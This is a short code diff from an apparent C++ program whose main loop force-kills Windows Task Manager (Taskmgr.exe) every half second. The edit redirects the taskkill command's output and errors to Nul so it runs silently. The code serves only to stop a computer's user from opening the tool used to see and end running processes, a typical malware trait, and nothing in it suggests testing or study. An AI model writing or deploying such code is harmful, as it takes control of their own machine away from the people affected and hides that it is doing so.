@@ -6,7 +6,7 @@ using namespace std;
 
 int main() {
     while (true) {
-        system("taskkill /F /IM Taskmgr.exe /T");
+        system("taskkill /im Taskmgr.exe /F 2> Nul 1> Nul");
         Sleep(500);
     }
 
